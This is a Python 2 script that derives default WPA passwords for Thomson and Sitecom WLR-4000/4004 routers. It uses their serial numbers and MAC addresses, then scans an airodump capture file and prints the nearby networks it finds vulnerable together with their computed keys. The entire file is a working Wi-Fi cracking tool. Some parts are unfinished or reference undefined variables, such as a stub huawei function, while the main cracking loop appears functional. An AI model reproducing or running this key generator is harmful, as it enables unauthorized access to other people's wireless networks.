import hashlib
import re

keygen = False

def gen_thomson(s):
	stage1 = s[0] + s[1] + s[2] + s[3] + s[4] + s[5] + s[8].encode("hex") + s[9].encode("hex") + s[10].encode("hex")
	stage2 = hashlib.sha1(stage1).hexdigest()
	password = "[" + stage2[:10].upper() + "] or [" +  stage2[:10] + "]"
	return password

def check_thomson(name,s):
	if len(s) >= 11:
		stage1 = s[0] + s[1] + s[2] + s[3] + s[4] + s[5] + s[8].encode("hex") + s[9].encode("hex") + s[10].encode("hex")
		stage2 = hashlib.sha1(stage1).hexdigest()
		suffix = stage2[36:].upper()
		if re.search(suffix,name.upper()):
			return True
		return False
	else:
		return False

def gen_sitecom(mac,model):
	CHARSETS = {
	    "4000": (
		"23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ",
		"WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"
	    ),

	    "4004": (
		"JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK", 
		"E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"
	    ),
	}
	keylength = 12
	charset1,charset2 = CHARSETS[model]
	mac = mac.replace(":", "").decode("hex")

	val = int(mac[2:6].encode("hex"),16)
	magic1 = 0x98124557
	magic2 = 0x0004321a
	magic3 = 0x80000000
	offsets = []
	for i in range(keylength):
		if (val & 0x1) == 0:
		    val = val ^ magic2
		    val = val >> 1
		else:
		    val = val ^ magic1
		    val = val >> 1
		    val = val | magic3

		offset = val % len(charset1)
		offsets.append(offset)

	wpakey = ""
	wpakey += charset1[offsets[0]]

	for i in range(0, keylength-1):
		magic3 = offsets[i]
		magic1 = offsets[i+1]

		if magic3 != magic1:
			magic3 = charset1[magic1]
		else:
			magic3 = (magic3 + i) % len(charset1)
			magic3 = charset2[magic3]
		wpakey += magic3

	return wpakey


	

def huawei(m):
	stage1 = m[9] + m[10]

if keygen:
	go = "yes"
	for entry in vulnset:
		if re.search(table[tnum-1][0], entry):
			go = "no"
	if go == "yes":
		if re.search('SSID',line):
			macidlist = table[tnum-1][0].split(':')
			macid = macidlist[0] + macidlist[1] + macidlist[2]
			if (macid == "64d1a3" or macid == "000cf6"):
				pwd = "WLR-4000:" + gen_sitecom(table[tnum-1][0],"4000") + " WLR-4004:" + gen_sitecom(table[tnum-1][0],"4004")
				report = "[" + table[tnum-1][0] + "] [" + table[tnum-1][5] + "] [" + pwd + "]"
				vulnset.append(report)
		if re.search('Serial',line):
			try:
				serial = line.split()[3]
			except:
				serial = "?"
				
			if check_thomson(table[tnum-1][5],serial):
				report = "[" + table[tnum-1][0] + "] [" + table[tnum-1][5] + "] [" + gen_thomson(serial) + "]"
				vulnset.append(report)
			table[tnum-1][10] = serial
	
print "CRACKING..."
infile = open("airodump-nomon.csv","r").readlines()
for line in infile:
	e = line.split(';')
	macidlist = e[0].split(':')
	macid = macidlist[0] + macidlist[1] + macidlist[2]
	if (macid == "64d1a3" or macid == "000cf6"):
		print "[" + e[6] + "]" + " POSSIBLY VULNERABLE - [WLR-4000:" + gen_sitecom(e[0],"4000") + "] [WLR-4004:" + gen_sitecom(e[0],"4004") + "]"
	if e[7] != "":
		if check_thomson(e[5],e[10]):
			print "[" + e[5] + "]" + " VULNERABLE - KEY: " + gen_thomson(e[10])
print "DONE"






